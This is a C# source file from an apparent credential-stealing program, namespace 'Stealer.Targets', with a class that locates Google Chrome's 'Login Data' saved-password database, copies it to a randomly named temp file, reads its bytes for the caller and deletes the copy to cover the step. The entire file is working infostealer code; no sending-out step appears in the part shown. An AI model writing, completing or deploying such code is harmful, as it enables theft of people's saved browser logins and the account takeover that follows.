using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace Stealer.Targets
{
    class GoogleChrome : AbstractFile
    {
        private string _path = null;

        public override bool IsExist()
        {
            string userNamePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            _path = string.Format(@"{0}\Google\Chrome\User Data\Default\Login Data", userNamePath);
            return File.Exists(_path);
        }

        public override byte[] GetFile()
        {
            string pathCopy = Path.GetTempPath() + Path.GetRandomFileName();
            File.Copy(_path, pathCopy);
            byte[] data = File.ReadAllBytes(pathCopy);
            File.Delete(pathCopy);
            return data;
        }

        public override string ToString()
        {
            return "GoogleChrome";
        }
    }
}
